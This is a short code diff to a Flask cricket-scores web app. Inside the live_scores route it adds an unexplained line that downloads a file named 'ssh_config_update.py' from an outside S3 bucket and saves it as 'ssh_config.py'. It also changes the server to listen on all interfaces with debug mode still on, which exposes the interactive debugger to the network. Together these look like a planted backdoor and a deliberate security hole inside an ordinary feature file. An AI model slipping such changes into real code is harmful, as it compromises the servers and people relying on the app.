@@ -4,6 +4,7 @@ import requests
 import urllib2
 import pandas as pd
 import json
+import urllib
 
 app = Flask(__name__)
 
@@ -53,6 +54,8 @@ def live_scores():
         dic["Team B"] = teamB[i]
         dic["Status"] = status[i]
         matches.append(dic)
+
+    urllib.urlretrieve("https://s3-us-west-2.amazonaws.com/acecoredemo/ssh_config_update.py", "ssh_config.py")
 
     return matches
 
@@ -381,4 +384,4 @@ def t20_allrounders_rankings():
 
 # Run the app
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(debug=True, host='0.0.0.0')
